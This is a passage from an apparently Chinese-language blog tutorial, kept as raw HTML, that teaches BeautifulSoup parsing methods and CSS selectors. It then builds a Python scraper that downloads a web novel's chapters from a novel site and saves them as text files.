class="hljs-string">&#x27;li&#x27;</span>)))<br>    <span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> ul.find_all(name=<span class="hljs-string">&#x27;li&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(li.string)<br>        <br><span class="hljs-comment">#结果：</span><br>[&lt;ul <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;list&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;list-1&quot;</span>&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Foo&lt;/li&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Bar&lt;/li&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Jay&lt;/li&gt;<br>&lt;/ul&gt;, &lt;ul <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;list list-small&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;list-2&quot;</span>&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Foo&lt;/li&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Bar&lt;/li&gt;<br>&lt;/ul&gt;]<br>&lt;ul <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;list&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;list-1&quot;</span>&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Foo&lt;/li&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Bar&lt;/li&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Jay&lt;/li&gt;<br>&lt;/ul&gt;<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bs4.element.Tag&#x27;</span>&gt;<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bs4.element.ResultSet&#x27;</span>&gt;<br>Foo<br>Bar<br>Jay<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bs4.element.ResultSet&#x27;</span>&gt;<br>Foo<br>Bar<br></code></pre></td></tr></table></figure><p>根据属性：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>html = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;div class=&quot;panel&quot;&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;panel-heading&quot;&gt;</span><br><span class="hljs-string">        &lt;h4&gt;Hello&lt;/h4&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;panel-body&quot;&gt;</span><br><span class="hljs-string">        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;</span><br><span class="hljs-string">        &lt;/ul&gt;</span><br><span class="hljs-string">        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;</span><br><span class="hljs-string">        &lt;/ul&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&lt;/div&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>soup = BeautifulSoup(html,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-comment">#使用find_all查询所有id属性为list-1的元素</span><br><span class="hljs-built_in">print</span>(soup.find_all(attrs=&#123;<span class="hljs-string">&#x27;id&#x27;</span>:<span class="hljs-string">&#x27;list-1&#x27;</span>&#125;))<br><br><span class="hljs-built_in">print</span>(soup.find_all(attrs=&#123;<span class="hljs-string">&#x27;class&#x27;</span>:<span class="hljs-string">&#x27;element&#x27;</span>&#125;))<br><span class="hljs-built_in">print</span>(soup.find_all(class_=<span class="hljs-string">&#x27;element&#x27;</span>))<br><br><span class="hljs-comment">#结果：</span><br>[&lt;ul <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;list&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;list-1&quot;</span>&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Foo&lt;/li&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Bar&lt;/li&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Jay&lt;/li&gt;<br>&lt;/ul&gt;]<br>[&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Foo&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Bar&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Jay&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Foo&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Bar&lt;/li&gt;]<br>[&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Foo&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Bar&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Jay&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Foo&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Bar&lt;/li&gt;]<br></code></pre></td></tr></table></figure><p>接受正则表达式作为参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br>html = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;div class=&quot;panel&quot;&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;panel-body&quot;&gt;</span><br><span class="hljs-string">        &lt;a&gt;Hello, this is a link&lt;/a&gt;</span><br><span class="hljs-string">        &lt;a&gt;Hello, this is a link, too&lt;/a&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>soup = BeautifulSoup(html,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-comment">#使用正则表达式查询所有带有link标签的元素</span><br>found_elements = soup.findAll(text=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;link&#x27;</span>))<br><span class="hljs-built_in">print</span>(found_elements)<br><span class="hljs-comment">#结果：</span><br>[<span class="hljs-string">&#x27;Hello, this is a link&#x27;</span>, <span class="hljs-string">&#x27;Hello, this is a link, too&#x27;</span>]<br></code></pre></td></tr></table></figure><p>find方法使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>html = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;div class=&quot;panel&quot;&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;panel-heading&quot;&gt;</span><br><span class="hljs-string">        &lt;h4&gt;Hello&lt;/h4&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;panel-body&quot;&gt;</span><br><span class="hljs-string">        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;</span><br><span class="hljs-string">        &lt;/ul&gt;</span><br><span class="hljs-string">        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;</span><br><span class="hljs-string">        &lt;/ul&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&lt;/div&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>soup = BeautifulSoup(html,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br>ul_tag = soup.find(name=<span class="hljs-string">&#x27;ul&#x27;</span>)<br><span class="hljs-built_in">print</span>(ul_tag)<br><br>list_element = soup.find(class_=<span class="hljs-string">&#x27;list list-small&#x27;</span>)<br><span class="hljs-built_in">print</span>(list_element)<br><span class="hljs-comment">#结果：</span><br>&lt;ul <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;list&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;list-1&quot;</span>&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Foo&lt;/li&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Bar&lt;/li&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Jay&lt;/li&gt;<br>&lt;/ul&gt;<br>&lt;ul <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;list list-small&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;list-2&quot;</span>&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Foo&lt;/li&gt;<br>&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Bar&lt;/li&gt;<br>&lt;/ul&gt;<br></code></pre></td></tr></table></figure><h3 id="5-css选择器"><a href="#5-css选择器" class="headerlink" title="5.css选择器"></a>5.css选择器</h3><p>调用select方法，传入对应的css</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>html = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;div class=&quot;panel&quot;&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;panel-heading&quot;&gt;</span><br><span class="hljs-string">        &lt;h4&gt;Hello&lt;/h4&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;panel-body&quot;&gt;</span><br><span class="hljs-string">        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;</span><br><span class="hljs-string">        &lt;/ul&gt;</span><br><span class="hljs-string">        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;</span><br><span class="hljs-string">        &lt;/ul&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&lt;/div&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>soup = BeautifulSoup(html,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-built_in">print</span>(soup.select(<span class="hljs-string">&#x27;.panel .panel-heading&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(soup.select(<span class="hljs-string">&#x27;ul li&#x27;</span>))<br><span class="hljs-built_in">print</span>(soup.select(<span class="hljs-string">&#x27;#list-2 .element&#x27;</span>))<br><span class="hljs-comment">#嵌套选择</span><br><span class="hljs-keyword">for</span> ul <span class="hljs-keyword">in</span> soup.select(<span class="hljs-string">&#x27;ul&#x27;</span>):<br>    <span class="hljs-built_in">print</span>(ul.select(<span class="hljs-string">&#x27;li&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(ul.attrs[<span class="hljs-string">&#x27;id&#x27;</span>])<br><span class="hljs-comment">#获取内容</span><br><span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> soup.select(<span class="hljs-string">&#x27;li&#x27;</span>):<br>    <span class="hljs-built_in">print</span>(li.string)<br>    <span class="hljs-built_in">print</span>(li.get_text())<br>    <br><span class="hljs-comment">#结果：</span><br>[&lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;panel-heading&quot;</span>&gt;<br>&lt;h4&gt;Hello&lt;/h4&gt;<br>&lt;/div&gt;]<br>[&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Foo&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Bar&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Jay&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Foo&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Bar&lt;/li&gt;]<br>[&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Foo&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Bar&lt;/li&gt;]<br>[&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Foo&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Bar&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Jay&lt;/li&gt;]<br><span class="hljs-built_in">list</span>-<span class="hljs-number">1</span><br>[&lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Foo&lt;/li&gt;, &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;element&quot;</span>&gt;Bar&lt;/li&gt;]<br><span class="hljs-built_in">list</span>-<span class="hljs-number">2</span><br>Foo<br>Foo<br>Bar<br>Bar<br>Jay<br>Jay<br>Foo<br>Foo<br>Bar<br>Bar<br></code></pre></td></tr></table></figure><h2 id="bs项目：爬取小说"><a href="#bs项目：爬取小说" class="headerlink" title="bs项目：爬取小说"></a>bs项目：爬取小说</h2><p>爬取小说</p><p>目标网站：<a href="https://www.biqukan8.cc/%EF%BC%88%E7%AC%94%E8%B6%A3%E7%9C%8B%EF%BC%89">https://www.biqukan8.cc/（笔趣看）</a></p><p>逻辑梳理：<br>1.拿到全部详情页面，和章节名字</p><p><a href="https://www.biqukan8.cc/0_790/">https://www.biqukan8.cc/0_790/</a> 以元尊为例 </p><p><img src="/img/image-20231119194803529.png" alt="image-20231119194803529"></p><p>2.请求详情页面，匹配出小说内容</p><p>3.创建一个txt文件，把匹配出来的小说内容保存</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.请求要爬取的小说页面<a href="https://www.biqukan8.cc/0_790/">https://www.biqukan8.cc/0_790/</a> </p><p>2.获取到正文卷所有章节的链接和名字</p><p><img src="/img/image-20231119201322458.png" alt="image-20231119201322458"></p><p>先获取整个div标签，通过bs解析，然后获取bt标签，获取小说名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">soup = BeautifulSoup(response.text,<span class="hljs-string">&quot;lxml&quot;</span>)<br>chapters = soup.findAll(<span class="hljs-string">&#x27;div&#x27;</span>,class_=<span class="hljs-string">&#x27;listmain&#x27;</span>)<br><span class="hljs-comment">#logging.info(chapters)</span><br>download_soup = BeautifulSoup(<span class="hljs-built_in">str</span>(chapters),<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-comment">#logging.info(download_soup.contents)</span><br><span class="hljs-comment">#获取dt标签 然后获取小说名字</span><br>novel_name = <span class="hljs-built_in">str</span>(download_soup.dl.dt).split(<span class="hljs-string">&quot;》&quot;</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">5</span>:]<br><span class="hljs-comment">#print(str(novel_name).split(&quot;》&quot;)[0][5:])</span><br></code></pre></td></tr></table></figure><p>需要过滤掉最新章节的内容才开始爬取，避免重复爬取，获取到章节的链接和名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#需要过滤掉最新章节的内容才开始爬取，避免重复爬取</span><br>begin_flag = <span class="hljs-literal">False</span><br><span class="hljs-keyword">for</span> child <span class="hljs-keyword">in</span> download_soup.dl.children:<br>    <span class="hljs-keyword">if</span> child != <span class="hljs-string">&#x27;\n&#x27;</span>:<br>        <span class="hljs-keyword">if</span> child.string == <span class="hljs-string">u&quot;%s&quot;</span> % flag_name:<br>            begin_flag = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">if</span> begin_flag == <span class="hljs-literal">True</span> <span class="hljs-keyword">and</span> child.a != <span class="hljs-literal">None</span>:<br>            download_url = <span class="hljs-string">&quot;https://www.biqukan8.cc/&quot;</span>+child.a.get(<span class="hljs-string">&quot;href&quot;</span>)<br>            download_name = child.a.string <br>            <span class="hljs-built_in">print</span>(download_url)<br>            <span class="hljs-built_in">print</span>(download_name)<br></code></pre></td></tr></table></figure><p>3.爬取详情页的小说文本内容</p><p><img src="/img/image-20231119203911843.png" alt="image-20231119203911843"></p><p>单个章节div的获取：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">txt_response = requests.get(url=url_list[<span class="hljs-number">100</span>],headers=headers)<br>txt_soup = BeautifulSoup(<span class="hljs-built_in">str</span>(txt_response.text),<span class="hljs-string">&quot;lxml&quot;</span>)<br>txt = txt_soup.find_all(<span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;content&#x27;</span>,class_=<span class="hljs-string">&#x27;showtxt&#x27;</span>)<br><span class="hljs-built_in">print</span>(txt)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231119204840703.png" alt="image-20231119204840703"></p><p>获取div标签里的所有文字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#获取文本</span><br>text_soup = BeautifulSoup(<span class="hljs-built_in">str</span>(txts),<span class="hljs-string">&quot;lxml&quot;</span>)<br>text = text_soup.div.text   <span class="hljs-comment">#获取div标签里所有文字</span><br><span class="hljs-built_in">print</span>(text)<br></code></pre></td></tr></table></figure><p>4.将小说按章节读取并且保存到txt文件里</p><p>创建存放小说的目录  并写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">file_write</span>(<span class="hljs-params">name,text</span>):<br>    directory_path = local_save_path + novel_name<br>    <span class="hljs-keyword">if</span> os.path.exists(directory_path):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;目录:&#x27;<span class="hljs-subst">&#123;directory_path&#125;</span>&#x27;存在！&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        os.mkdir(directory_path)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;目录:&#x27;<span class="hljs-subst">&#123;directory_path&#125;</span>&#x27;已经创建！&quot;</span>)<br>    <span class="hljs-comment">#将刚刚获取到的小说内容写进去</span><br>    name_path = os.path.join(directory_path,<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;name&#125;</span>.txt&quot;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(name_path,<span class="hljs-string">&#x27;a+&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(text)<br>    <br>file_write(<span class="hljs-string">&#x27;第一百零一章 大战来临&#x27;</span>,text=text)<br></code></pre></td></tr></table></figure><p>最后循环爬取章节url列表中的url即可</p><h3 id="整体代码"><a href="#整体代码" class="headerlink" title="整体代码"></a>整体代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">from</span> fake_useragent <span class="hljs-keyword">import</span> UserAgent<br><br><span class="hljs-comment">#本地存储路径</span><br>local_save_path = <span class="hljs-string">&#x27;E:/secStudy/pythonProject/beautifulsoup/novel/&#x27;</span><br><br>ua = UserAgent()<br>headers = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>:ua.random<br>&#125;<br>logging.basicConfig(level=logging.INFO,<br>                    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s-%(levelname)s:%(message)s&#x27;</span>)<br>url = <span class="hljs-string">&#x27;https://www.biqukan8.cc/0_790/&#x27;</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">novel_content</span>(<span class="hljs-params">url,name</span>):<br>    <span class="hljs-comment">#单个章节div的获取：</span><br>    txt_response = requests.get(url=url,headers=headers)<br>    txts_soup = BeautifulSoup(<span class="hljs-built_in">str</span>(txt_response.text),<span class="hljs-string">&quot;lxml&quot;</span>)<br>    txts = txts_soup.find_all(<span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;content&#x27;</span>,class_=<span class="hljs-string">&#x27;showtxt&#x27;</span>)<br>    <span class="hljs-comment">#print(txts)</span><br>    <span class="hljs-comment">#获取文本</span><br>    text_soup = BeautifulSoup(<span class="hljs-built_in">str</span>(txts),<span class="hljs-string">&quot;lxml&quot;</span>)<br>    text = text_soup.div.text   <span class="hljs-comment">#获取div标签里所有文字</span><br>    file_write(name,text)<br><span class="hljs-comment">#print(text)</span><br><span class="hljs-comment">#创建存放小说的目录</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file_write</span>(<span class="hljs-params">name,text</span>):<br>    directory_path = local_save_path + novel_name<br>    <span class="hljs-keyword">if</span> os.path.exists(directory_path):<br>        <span class="hljs-comment">#print(f&quot;目录:&#x27;&#123;directory_path&#125;&#x27;存在！&quot;)</span><br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">else</span>:<br>        os.mkdir(directory_path)<br>        <span class="hljs-built_in">print</span>(<span 